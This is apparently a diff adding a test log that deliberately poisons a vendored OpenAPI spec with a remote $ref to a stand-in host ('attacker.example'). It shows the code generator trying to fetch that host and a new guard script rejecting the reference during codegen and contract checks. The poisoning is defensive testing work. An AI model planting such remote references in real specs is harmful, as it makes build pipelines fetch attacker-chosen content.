@@ -1,0 +1,43 @@
+# A3 RED — controlled mutation of the vendored spec
+# One local $ref replaced by a remote one (line 60).
+
+$ grep -n 'attacker.example' contracts/vizra-core/api/openapi.yaml
+60:                $ref: "https://attacker.example/pwn.yaml#/Schema"
+
+## 1. The reviewer's UNVERIFIED reachability claim, now demonstrated.
+## openapi-typescript 7.13.0 driven DIRECTLY on the poisoned spec, with no guard:
+$ ./node_modules/.bin/openapi-typescript contracts/vizra-core/api/openapi.yaml -o /tmp/poisoned.ts
+✨ openapi-typescript 7.13.0
+ ✘  Can't resolve $ref: fetch failed at #/paths/~1healthz/get/responses/200/content/application~1json/schema
+file:///Users/yosefgamble/github/vizra/vizra-user/node_modules/openapi-typescript/dist/lib/redoc.mjs:74
+      throw new Error(errorMessage);
+EXIT=1 (crashes; 'fetch failed' is the outbound request to attacker.example)
+
+## 2. The new guard, standalone:
+$ node scripts/check-spec-refs.mjs
+
+❌ /Users/yosefgamble/github/vizra/vizra-user/contracts/vizra-core/api/openapi.yaml contains 1 non-local $ref:
+  line 60: $ref: https://attacker.example/pwn.yaml#/Schema
+
+Only in-document pointers (`#/...`) may appear in the vendored contract.
+A remote $ref makes codegen fetch a host of the spec author's choosing in CI;
+a file $ref adds an input that contracts/manifest.json's sha256 does not cover.
+The contract is vizra-core's to change (ADR-002): re-vendor it with
+scripts/vendor-contract.mjs rather than editing the copy here.
+
+EXIT=1
+
+## 3. npm run codegen — the guard runs inside generate(), before the generator:
+$ npm run codegen
+
+> vizra-user@0.0.0 codegen
+> node scripts/codegen.mjs
+
+
+❌ codegen refused the contract: /Users/yosefgamble/github/vizra/vizra-user/contracts/vizra-core/api/openapi.yaml contains 1 non-local $ref:
+EXIT=1
+
+## 4. npm run check:contract — the contract lane calls the same generate():
+$ npm run check:contract
+❌ codegen refused the contract: /Users/yosefgamble/github/vizra/vizra-user/contracts/vizra-core/api/openapi.yaml contains 1 non-local $ref:
+EXIT=1
